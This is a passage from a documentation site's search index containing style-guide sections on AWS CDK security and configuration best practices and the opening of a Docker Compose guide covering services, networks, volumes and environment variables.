myKmsKey,\n  enforceSSL: true,  // \u2705 Require HTTPS\n});\n\n// Good - RDS encryption\nconst database = new rds.DatabaseInstance(this, 'Database', {\n  storageEncrypted: true,  // \u2705 Encrypt at rest\n  storageEncryptionKey: myKmsKey,  // Use customer-managed key\n});\n\n// Good - EBS encryption\nconst instance = new ec2.Instance(this, 'Instance', {\n  blockDevices: [{\n    deviceName: '/dev/xvda',\n    volume: ec2.BlockDeviceVolume.ebs(30, {\n      encrypted: true,  // \u2705 Encrypted EBS\n      kmsKey: myKmsKey,\n    }),\n  }],\n});\n</code></pre> <p>Key Points:</p> <ul> <li>Enable encryption for all storage (S3, EBS, RDS)</li> <li>Use KMS for key management</li> <li>Enforce SSL/TLS for data in transit</li> <li>Enable encryption by default</li> <li>Use customer-managed keys for sensitive data</li> <li>Implement key rotation</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#iam-least-privilege","title":"IAM Least Privilege","text":"<p>Grant minimum required permissions:</p> <pre><code>// Bad - Overly permissive IAM\nconst role = new iam.Role(this, 'Role', {\n  assumedBy: new iam.ServicePrincipal('lambda.amazonaws.com'),\n  managedPolicies: [\n    iam.ManagedPolicy.fromAwsManagedPolicyName('AdministratorAccess'),  // \u274c Too permissive!\n  ],\n});\n\n// Good - Least privilege\nconst role = new iam.Role(this, 'Role', {\n  assumedBy: new iam.ServicePrincipal('lambda.amazonaws.com'),\n});\n\n// Grant specific permissions only\nbucket.grantRead(role);  // \u2705 Only read access to specific bucket\n\n// Or create custom policy\nrole.addToPolicy(new iam.PolicyStatement({\n  actions: ['s3:GetObject'],\n  resources: [`${bucket.bucketArn}/public/*`],  // \u2705 Specific resources only\n}));\n</code></pre> <p>Key Points:</p> <ul> <li>Never use <code>AdministratorAccess</code> or <code>*</code> permissions</li> <li>Use high-level grant methods (<code>grantRead</code>, <code>grantWrite</code>)</li> <li>Specify exact resources in policies</li> <li>Use condition keys to further restrict access</li> <li>Regular IAM access review</li> <li>Implement permission boundaries</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#network-security","title":"Network Security","text":"<p>Implement proper network isolation:</p> <pre><code>// Good - VPC with proper segmentation\nconst vpc = new ec2.Vpc(this, 'VPC', {\n  maxAzs: 3,\n  subnetConfiguration: [\n    {\n      cidrMask: 24,\n      name: 'Public',\n      subnetType: ec2.SubnetType.PUBLIC,\n    },\n    {\n      cidrMask: 24,\n      name: 'Private',\n      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n    },\n    {\n      cidrMask: 28,\n      name: 'Isolated',\n      subnetType: ec2.SubnetType.PRIVATE_ISOLATED,  // \u2705 No internet access\n    },\n  ],\n});\n\n// Good - Restrictive security groups\nconst dbSecurityGroup = new ec2.SecurityGroup(this, 'DatabaseSG', {\n  vpc,\n  description: 'Security group for RDS database',\n  allowAllOutbound: false,  // \u2705 Explicit egress rules\n});\n\n// Only allow from application security group\ndbSecurityGroup.addIngressRule(\n  appSecurityGroup,\n  ec2.Port.tcp(5432),\n  'Allow PostgreSQL from app'\n);\n\n// Good - NACLs for additional security\nconst nacl = new ec2.NetworkAcl(this, 'NACL', {\n  vpc,\n  subnetSelection: { subnetType: ec2.SubnetType.PRIVATE_ISOLATED },\n});\n\nnacl.addEntry('DenySSH', {\n  cidr: ec2.AclCidr.anyIpv4(),\n  ruleNumber: 100,\n  traffic: ec2.AclTraffic.tcpPort(22),\n  direction: ec2.TrafficDirection.INGRESS,\n  ruleAction: ec2.Action.DENY,  // \u2705 Deny SSH\n});\n</code></pre> <p>Key Points:</p> <ul> <li>Use private subnets for sensitive resources</li> <li>Create isolated subnets for databases</li> <li>Implement restrictive security groups</li> <li>Use NACLs for additional layer</li> <li>Enable VPC Flow Logs</li> <li>Implement AWS PrivateLink for AWS services</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#resource-deletion-protection","title":"Resource Deletion Protection","text":"<p>Protect critical resources from accidental deletion:</p> <pre><code>// Good - Deletion protection for databases\nconst database = new rds.DatabaseInstance(this, 'Database', {\n  deletionProtection: true,  // \u2705 Cannot be deleted\n  removalPolicy: cdk.RemovalPolicy.RETAIN,  // \u2705 Keep on stack deletion\n  backupRetention: cdk.Duration.days(30),\n});\n\n// Good - S3 bucket protection\nconst bucket = new s3.Bucket(this, 'DataBucket', {\n  removalPolicy: cdk.RemovalPolicy.RETAIN,  // \u2705 Keep bucket\n  versioned: true,  // Enable versioning\n  lifecycleRules: [{\n    noncurrentVersionExpiration: cdk.Duration.days(90),\n  }],\n});\n\n// Good - Prevent accidental destruction\ncdk.Aspects.of(this).add(new cdk.Tag('Environment', 'production'));\n</code></pre> <p>Key Points:</p> <ul> <li>Use <code>RemovalPolicy.RETAIN</code> for production resources</li> <li>Enable deletion protection on databases</li> <li>Enable versioning on S3 buckets</li> <li>Require manual approval for destructive changes</li> <li>Use stack policies to prevent updates</li> <li>Implement backup and recovery procedures</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#logging-and-monitoring","title":"Logging and Monitoring","text":"<p>Enable comprehensive logging:</p> <pre><code>// Good - CloudTrail for audit logging\nnew cloudtrail.Trail(this, 'Trail', {\n  isMultiRegionTrail: true,\n  includeGlobalServiceEvents: true,\n  managementEvents: cloudtrail.ReadWriteType.ALL,\n});\n\n// Good - VPC Flow Logs\nvpc.addFlowLog('FlowLog', {\n  destination: ec2.FlowLogDestination.toCloudWatchLogs(),\n  trafficType: ec2.FlowLogTrafficType.ALL,\n});\n\n// Good - S3 bucket logging\nconst logBucket = new s3.Bucket(this, 'LogBucket', {\n  encryption: s3.BucketEncryption.S3_MANAGED,\n  blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL,\n});\n\nbucket.enableEventBridgeNotification();\nbucket.addEventNotification(\n  s3.EventType.OBJECT_CREATED,\n  new s3n.SnsDestination(topic),\n  { prefix: 'sensitive/' }\n);\n\n// Good - Lambda function logging\nconst fn = new lambda.Function(this, 'Function', {\n  runtime: lambda.Runtime.NODEJS_18_X,\n  handler: 'index.handler',\n  code: lambda.Code.fromAsset('lambda'),\n  logRetention: logs.RetentionDays.ONE_MONTH,\n  insightsVersion: lambda.LambdaInsightsVersion.VERSION_1_0_229_0,  // \u2705 CloudWatch Insights\n});\n</code></pre> <p>Key Points:</p> <ul> <li>Enable CloudTrail for all accounts</li> <li>Configure VPC Flow Logs</li> <li>Enable S3 bucket logging and access logs</li> <li>Use CloudWatch Logs for application logs</li> <li>Set appropriate log retention</li> <li>Monitor and alert on suspicious activity</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#security-scanning","title":"Security Scanning","text":"<p>Implement security scanning in CI/CD:</p> <pre><code>// package.json - Add security scanning\n{\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"cdk\": \"cdk\",\n    \"security\": \"npm audit &amp;&amp; cdk-nag\",\n    \"synth\": \"cdk synth\",\n    \"deploy\": \"npm run security &amp;&amp; cdk deploy\"\n  },\n  \"devDependencies\": {\n    \"cdk-nag\": \"^2.0.0\"\n  }\n}\n\n// bin/app.ts - Add CDK Nag for compliance\nimport { AwsSolutionsChecks } from 'cdk-nag';\nimport { Aspects } from 'aws-cdk-lib';\n\nconst app = new cdk.App();\n\n// Add security checks\nAspects.of(app).add(new AwsSolutionsChecks({ verbose: true }));\n\nnew MyStack(app, 'MyStack');\n</code></pre> <p>Key Points:</p> <ul> <li>Use cdk-nag for security scanning</li> <li>Run security checks in CI/CD pipeline</li> <li>Scan for common misconfigurations</li> <li>Implement compliance frameworks (CIS, PCI-DSS)</li> <li>Regular dependency audits (<code>npm audit</code>)</li> <li>Update CDK and dependencies regularly</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#anti-patterns","title":"Anti-Patterns","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-hardcoded-values","title":"\u274c Avoid: Hardcoded Values","text":"<pre><code>// Bad\nnew s3.Bucket(this, 'Bucket', {\n  bucketName: 'my-hardcoded-bucket-name',\n});\n\n// Good - Let CDK generate names\nnew s3.Bucket(this, 'Bucket');\n\n// Good - Use configuration\nnew s3.Bucket(this, 'Bucket', {\n  bucketName: props.bucketName,\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-not-using-typescript-strict-mode","title":"\u274c Avoid: Not Using TypeScript Strict Mode","text":"<pre><code>// tsconfig.json - Enable strict mode\n{\n  \"compilerOptions\": {\n    \"strict\": true,\n    \"noImplicitAny\": true\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-no-tests","title":"\u274c Avoid: No Tests","text":"<pre><code>// Always write tests for your stacks\ndescribe('MyStack', () =&gt; {\n  test('Stack creates resources', () =&gt; {\n    const app = new cdk.App();\n    const stack = new MyStack(app, 'TestStack');\n    const template = Template.fromStack(stack);\n    template.resourceCountIs('AWS::S3::Bucket', 1);\n  });\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-not-using-constructs","title":"\u274c Avoid: Not Using Constructs","text":"<pre><code>// Bad - Using low-level L1 constructs directly\nnew s3.CfnBucket(this, 'Bucket', {\n  bucketName: 'my-bucket',\n  versioningConfiguration: {\n    status: 'Enabled'\n  }\n});\n\n// Good - Use high-level L2 constructs\nnew s3.Bucket(this, 'Bucket', {\n  versioned: true,\n  encryption: s3.BucketEncryption.S3_MANAGED,\n  removalPolicy: cdk.RemovalPolicy.RETAIN\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-not-specifying-removal-policy","title":"\u274c Avoid: Not Specifying Removal Policy","text":"<pre><code>// Bad - Default removal policy (may delete production data)\nnew dynamodb.Table(this, 'Table', {\n  partitionKey: { name: 'id', type: dynamodb.AttributeType.STRING }\n  // No removalPolicy - uses default\n});\n\n// Good - Explicit removal policy\nnew dynamodb.Table(this, 'Table', {\n  partitionKey: { name: 'id', type: dynamodb.AttributeType.STRING },\n  removalPolicy: cdk.RemovalPolicy.RETAIN  // \u2705 Protect production data\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-single-stack-for-everything","title":"\u274c Avoid: Single Stack for Everything","text":"<pre><code>// Bad - Everything in one massive stack\nexport class MonolithStack extends cdk.Stack {\n  constructor(scope: Construct, id: string) {\n    super(scope, id);\n    // VPC\n    // Database\n    // Lambda functions\n    // API Gateway\n    // S3 buckets\n    // ... 500 lines of resources\n  }\n}\n\n// Good - Separate stacks by concern\nexport class NetworkStack extends cdk.Stack {\n  public readonly vpc: ec2.Vpc;\n  constructor(scope: Construct, id: string) {\n    super(scope, id);\n    this.vpc = new ec2.Vpc(this, 'VPC');\n  }\n}\n\nexport class DatabaseStack extends cdk.Stack {\n  constructor(scope: Construct, id: string, props: { vpc: ec2.Vpc }) {\n    super(scope, id);\n    new rds.DatabaseInstance(this, 'Database', {\n      vpc: props.vpc\n    });\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#avoid-not-using-environment-variables","title":"\u274c Avoid: Not Using Environment Variables","text":"<pre><code>// Bad - Environment-specific values in code\nconst app = new cdk.App();\nnew MyStack(app, 'ProdStack', {\n  env: { account: '123456789012', region: 'us-east-1' }  // \u274c Hardcoded\n});\n\n// Good - Use environment variables\nconst app = new cdk.App();\nnew MyStack(app, 'Stack', {\n  env: {\n    account: process.env.CDK_DEFAULT_ACCOUNT,\n    region: process.env.CDK_DEFAULT_REGION\n  }\n});\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#tool-configuration","title":"Tool Configuration","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#cdkjson","title":"cdk.json","text":"<pre><code>{\n  \"app\": \"npx ts-node --prefer-ts-exts bin/app.ts\",\n  \"watch\": {\n    \"include\": [\"**\"],\n    \"exclude\": [\n      \"README.md\",\n      \"cdk*.json\",\n      \"**/*.d.ts\",\n      \"**/*.js\",\n      \"tsconfig.json\",\n      \"package*.json\",\n      \"yarn.lock\",\n      \"node_modules\",\n      \"test\"\n    ]\n  },\n  \"context\": {\n    \"@aws-cdk/aws-lambda:recognizeLayerVersion\": true,\n    \"@aws-cdk/core:checkSecretUsage\": true,\n    \"@aws-cdk/core:target-partitions\": [\"aws\", \"aws-cn\"],\n    \"@aws-cdk-containers/ecs-service-extensions:enableDefaultLogDriver\": true,\n    \"@aws-cdk/aws-ec2:uniqueImdsv2TemplateName\": true,\n    \"@aws-cdk/aws-ecs:arnFormatIncludesClusterName\": true,\n    \"@aws-cdk/aws-iam:minimizePolicies\": true,\n    \"@aws-cdk/core:validateSnapshotRemovalPolicy\": true,\n    \"@aws-cdk/aws-codepipeline:crossAccountKeyAliasStackSafeResourceName\": true,\n    \"@aws-cdk/aws-s3:createDefaultLoggingPolicy\": true,\n    \"@aws-cdk/aws-sns-subscriptions:restrictSqsDescryption\": true,\n    \"@aws-cdk/aws-apigateway:disableCloudWatchRole\": true,\n    \"@aws-cdk/core:enablePartitionLiterals\": true,\n    \"@aws-cdk/aws-events:eventsTargetQueueSameAccount\": true,\n    \"@aws-cdk/aws-iam:standardizedServicePrincipals\": true,\n    \"@aws-cdk/aws-ecs:disableExplicitDeploymentControllerForCircuitBreaker\": true,\n    \"@aws-cdk/aws-iam:importedRoleStackSafeDefaultPolicyName\": true,\n    \"@aws-cdk/aws-s3:serverAccessLogsUseBucketPolicy\": true,\n    \"@aws-cdk/aws-route53-patters:useCertificate\": true,\n    \"@aws-cdk/customresources:installLatestAwsSdkDefault\": false\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#tsconfigjson","title":"tsconfig.json","text":"<pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"module\": \"commonjs\",\n    \"lib\": [\"es2020\"],\n    \"declaration\": true,\n    \"strict\": true,\n    \"noImplicitAny\": true,\n    \"strictNullChecks\": true,\n    \"noImplicitThis\": true,\n    \"alwaysStrict\": true,\n    \"noUnusedLocals\": false,\n    \"noUnusedParameters\": false,\n    \"noImplicitReturns\": true,\n    \"noFallthroughCasesInSwitch\": false,\n    \"inlineSourceMap\": true,\n    \"inlineSources\": true,\n    \"experimentalDecorators\": true,\n    \"strictPropertyInitialization\": false,\n    \"typeRoots\": [\"./node_modules/@types\"],\n    \"resolveJsonModule\": true,\n    \"esModuleInterop\": true\n  },\n  \"exclude\": [\"node_modules\", \"cdk.out\"]\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#packagejson-scripts","title":"package.json Scripts","text":"<pre><code>{\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"watch\": \"tsc -w\",\n    \"test\": \"jest\",\n    \"test:watch\": \"jest --watch\",\n    \"test:coverage\": \"jest --coverage\",\n    \"cdk\": \"cdk\",\n    \"synth\": \"cdk synth\",\n    \"deploy\": \"cdk deploy\",\n    \"deploy:all\": \"cdk deploy --all\",\n    \"diff\": \"cdk diff\",\n    \"destroy\": \"cdk destroy\",\n    \"bootstrap\": \"cdk bootstrap\",\n    \"lint\": \"eslint . --ext .ts\",\n    \"lint:fix\": \"eslint . --ext .ts --fix\",\n    \"format\": \"prettier --write \\\"**/*.ts\\\"\",\n    \"format:check\": \"prettier --check \\\"**/*.ts\\\"\",\n    \"validate\": \"npm run lint &amp;&amp; npm run format:check &amp;&amp; npm run test\"\n  },\n  \"devDependencies\": {\n    \"@types/jest\": \"^29.5.0\",\n    \"@types/node\": \"^20.0.0\",\n    \"@typescript-eslint/eslint-plugin\": \"^6.0.0\",\n    \"@typescript-eslint/parser\": \"^6.0.0\",\n    \"aws-cdk\": \"^2.100.0\",\n    \"eslint\": \"^8.50.0\",\n    \"jest\": \"^29.5.0\",\n    \"prettier\": \"^3.0.0\",\n    \"ts-jest\": \"^29.1.0\",\n    \"ts-node\": \"^10.9.0\",\n    \"typescript\": \"^5.2.0\"\n  },\n  \"dependencies\": {\n    \"aws-cdk-lib\": \"^2.100.0\",\n    \"constructs\": \"^10.0.0\",\n    \"source-map-support\": \"^0.5.21\"\n  }\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#eslint-configuration","title":"ESLint Configuration","text":"<pre><code>// .eslintrc.js\nmodule.exports = {\n  root: true,\n  parser: '@typescript-eslint/parser',\n  parserOptions: {\n    ecmaVersion: 2020,\n    sourceType: 'module',\n    project: './tsconfig.json',\n  },\n  plugins: ['@typescript-eslint'],\n  extends: [\n    'eslint:recommended',\n    'plugin:@typescript-eslint/recommended',\n    'plugin:@typescript-eslint/recommended-requiring-type-checking',\n  ],\n  rules: {\n    '@typescript-eslint/no-explicit-any': 'error',\n    '@typescript-eslint/explicit-function-return-type': 'warn',\n    '@typescript-eslint/no-unused-vars': [\n      'error',\n      { argsIgnorePattern: '^_' },\n    ],\n    '@typescript-eslint/no-floating-promises': 'error',\n    '@typescript-eslint/await-thenable': 'error',\n  },\n  ignorePatterns: ['*.js', '*.d.ts', 'node_modules/', 'cdk.out/'],\n};\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#jest-configuration","title":"Jest Configuration","text":"<pre><code>// jest.config.js\nmodule.exports = {\n  testEnvironment: 'node',\n  roots: ['&lt;rootDir&gt;/test'],\n  testMatch: ['**/*.test.ts'],\n  transform: {\n    '^.+\\\\.tsx?$': 'ts-jest',\n  },\n  collectCoverageFrom: [\n    'lib/**/*.ts',\n    '!lib/**/*.d.ts',\n    '!lib/**/*.test.ts',\n  ],\n  coverageThreshold: {\n    global: {\n      branches: 70,\n      functions: 70,\n      lines: 70,\n      statements: 70,\n    },\n  },\n  moduleFileExtensions: ['ts', 'tsx', 'js', 'jsx', 'json', 'node'],\n};\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#prettier-configuration","title":"Prettier Configuration","text":"<pre><code>{\n  \"printWidth\": 100,\n  \"tabWidth\": 2,\n  \"useTabs\": false,\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"trailingComma\": \"es5\",\n  \"bracketSpacing\": true,\n  \"arrowParens\": \"always\"\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v3.1.0\n    hooks:\n      - id: prettier\n        types_or: [javascript, jsx, ts, tsx, json]\n\n  - repo: https://github.com/pre-commit/mirrors-eslint\n    rev: v8.56.0\n    hooks:\n      - id: eslint\n        files: \\.[jt]sx?$\n        types: [file]\n        additional_dependencies:\n          - eslint@8.56.0\n          - '@typescript-eslint/eslint-plugin@6.21.0'\n          - '@typescript-eslint/parser@6.21.0'\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"[typescript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.eslint\": \"explicit\"\n    }\n  },\n  \"typescript.tsdk\": \"node_modules/typescript/lib\",\n  \"typescript.enablePromptUseWorkspaceTsdk\": true,\n  \"eslint.validate\": [\"javascript\", \"javascriptreact\", \"typescript\", \"typescriptreact\"],\n  \"cdk.path\": \"node_modules/.bin/cdk\"\n}\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#makefile","title":"Makefile","text":"<pre><code>## Makefile\n.PHONY: install build test deploy clean\n\ninstall:\n npm install\n\nbuild:\n npm run build\n\ntest:\n npm run test\n\ntest-coverage:\n npm run test:coverage\n\nlint:\n npm run lint\n\nlint-fix:\n npm run lint:fix\n\nformat:\n npm run format\n\nformat-check:\n npm run format:check\n\nvalidate: lint format-check test\n @echo \"\u2713 All validations passed\"\n\nsynth:\n npm run synth\n\ndiff:\n npm run diff\n\ndeploy:\n npm run deploy\n\ndeploy-all:\n npm run deploy:all\n\ndestroy:\n npm run destroy\n\nclean:\n rm -rf node_modules cdk.out coverage .nyc_output\n rm -f *.js *.d.ts\n\nbootstrap:\n npm run bootstrap\n</code></pre>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#references","title":"References","text":"","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#official-documentation","title":"Official Documentation","text":"<ul> <li>AWS CDK Documentation</li> <li>CDK API Reference</li> <li>CDK Workshop</li> </ul>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/cdk/#additional-resources","title":"Additional Resources","text":"<ul> <li>Best Practices</li> <li>CDK Patterns</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["aws-cdk","cdk","aws","infrastructure","typescript","iac"]},{"location":"02_language_guides/docker_compose/","title":"Docker Compose Style Guide","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#language-overview","title":"Language Overview","text":"<p>Docker Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application's services, networks, and volumes. This guide covers Docker Compose best practices for maintainable, production-ready container orchestration.</p>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>File Name: <code>docker-compose.yml</code> or <code>docker-compose.yaml</code></li> <li>Format: YAML</li> <li>Primary Use: Multi-container applications, development environments, testing</li> <li>Version: Compose file format version 3.8+ (Docker Compose V2)</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes File Naming Development <code>docker-compose.yml</code> <code>docker-compose.yml</code> Default compose file Production <code>docker-compose.prod.yml</code> <code>docker-compose.prod.yml</code> Production overrides Testing <code>docker-compose.test.yml</code> <code>docker-compose.test.yml</code> Test environment Top-Level Keys <code>version</code> Compose file version <code>version: \"3.8\"</code> File format version <code>services</code> Container definitions Service configurations Required <code>networks</code> Network definitions Custom networks Optional <code>volumes</code> Volume definitions Persistent storage Optional Service Configuration <code>image</code> Container image <code>image: node:20-alpine</code> Docker image to use <code>build</code> Build configuration <code>build: ./app</code> Build from Dockerfile <code>ports</code> Port mapping <code>ports: [\"3000:3000\"]</code> Host:container <code>environment</code> Environment vars <code>NODE_ENV: production</code> Container env vars <code>volumes</code> Mount points <code>./src:/app/src</code> Host:container paths <code>depends_on</code> Service dependencies <code>depends_on: [db]</code> Start order <code>networks</code> Network assignment <code>networks: [frontend]</code> Attach to networks Best Practices Version Pinning Pin image versions <code>node:20.10.0-alpine</code> Avoid <code>latest</code> tag <code>.env</code> Files Use env files <code>.env</code> for secrets Never commit secrets Health Checks Define health checks <code>healthcheck: {...}</code> Service readiness Resource Limits Set limits <code>mem_limit</code>, <code>cpus</code> Prevent resource exhaustion Common Patterns Web + DB Multi-tier apps <code>web</code> + <code>db</code> services Standard pattern Dev Overrides Use multiple files <code>-f compose.yml -f dev.yml</code> Layer configurations Secrets Use secrets (v3.1+) <code>secrets:</code> block Secure sensitive data","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#basic-structure","title":"Basic Structure","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#simple-compose-file","title":"Simple Compose File","text":"<pre><code>version: '3.8'\n\nservices:\n  web:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n    volumes:\n      - ./html:/usr/share/nginx/html:ro\n\n  database:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_PASSWORD: secret\n    volumes:\n      - db_data:/var/lib/postgresql/data\n\nvolumes:\n  db_data:\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#services","title":"Services","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#service-with-build","title":"Service with Build","text":"<pre><code>services:\n  web:\n    build:\n      context: ./web\n      dockerfile: Dockerfile\n      args:\n        NODE_ENV: production\n    image: myapp/web:latest\n    container_name: web-app\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NODE_ENV=production\n      - API_URL=http://api:8080\n    depends_on:\n      - api\n      - database\n    restart: unless-stopped\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#service-configuration-options","title":"Service Configuration Options","text":"<pre><code>services:\n  app:\n    image: myapp:latest\n    container_name: my-app\n    hostname: app-server\n\n    # Resource limits\n    deploy:\n      resources:\n        limits:\n          cpus: '0.5'\n          memory: 512M\n        reservations:\n          cpus: '0.25'\n          memory: 256M\n\n    # Health check\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n\n    # Restart policy\n    restart: unless-stopped\n\n    # User\n    user: \"1000:1000\"\n\n    # Working directory\n    working_dir: /app\n\n    # Command override\n    command: [\"npm\", \"start\"]\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#networks","title":"Networks","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#default-network","title":"Default Network","text":"<pre><code>## Services can communicate using service names as hostnames\nservices:\n  web:\n    image: nginx\n\n  api:\n    image: myapi\n    # Can access nginx at http://web\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#custom-networks","title":"Custom Networks","text":"<pre><code>services:\n  frontend:\n    image: nginx\n    networks:\n      - frontend_net\n      - backend_net\n\n  api:\n    image: myapi\n    networks:\n      - backend_net\n\n  database:\n    image: postgres\n    networks:\n      - backend_net\n\nnetworks:\n  frontend_net:\n    driver: bridge\n  backend_net:\n    driver: bridge\n    internal: true  # No external access\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#network-configuration","title":"Network Configuration","text":"<pre><code>networks:\n  custom_network:\n    driver: bridge\n    driver_opts:\n      com.docker.network.bridge.name: br-custom\n    ipam:\n      driver: default\n      config:\n        - subnet: 172.28.0.0/16\n          gateway: 172.28.0.1\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#volumes","title":"Volumes","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#named-volumes","title":"Named Volumes","text":"<pre><code>services:\n  database:\n    image: postgres:15\n    volumes:\n      - db_data:/var/lib/postgresql/data\n      - db_backup:/backup\n\nvolumes:\n  db_data:\n    driver: local\n  db_backup:\n    driver: local\n    driver_opts:\n      type: none\n      o: bind\n      device: /path/to/backup\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#bind-mounts","title":"Bind Mounts","text":"<pre><code>services:\n  web:\n    image: nginx\n    volumes:\n      # Bind mount - full path\n      - /host/path:/container/path\n\n      # Bind mount - relative path\n      - ./config/nginx.conf:/etc/nginx/nginx.conf:ro\n\n      # Named volume\n      - app_data:/data\n\n      # Anonymous volume\n      - /app/node_modules\n\nvolumes:\n  app_data:\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#environment-variables","title":"Environment Variables","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#direct-environment-variables","title":"Direct Environment Variables","text":"<pre><code>services:\n  app:\n    image: myapp\n    environment:\n      NODE_ENV: production\n      DATABASE_URL: postgresql://user:pass@db:5432/mydb\n      API_KEY: ${API_KEY}  # From host environment\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#environment-file","title":"Environment File","text":"<pre><code>services:\n  app:\n    image: myapp\n    env_file:\n      - .env\n      - .env.production\n</code></pre> <p>Example <code>.env</code> file:</p> <pre><code>NODE_ENV=production\nDATABASE_URL=postgresql://user:pass@db:5432/mydb\nREDIS_URL=redis://redis:6379\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#complete-application-example","title":"Complete Application Example","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#full-stack-web-application","title":"Full-Stack Web Application","text":"<pre><code>version: 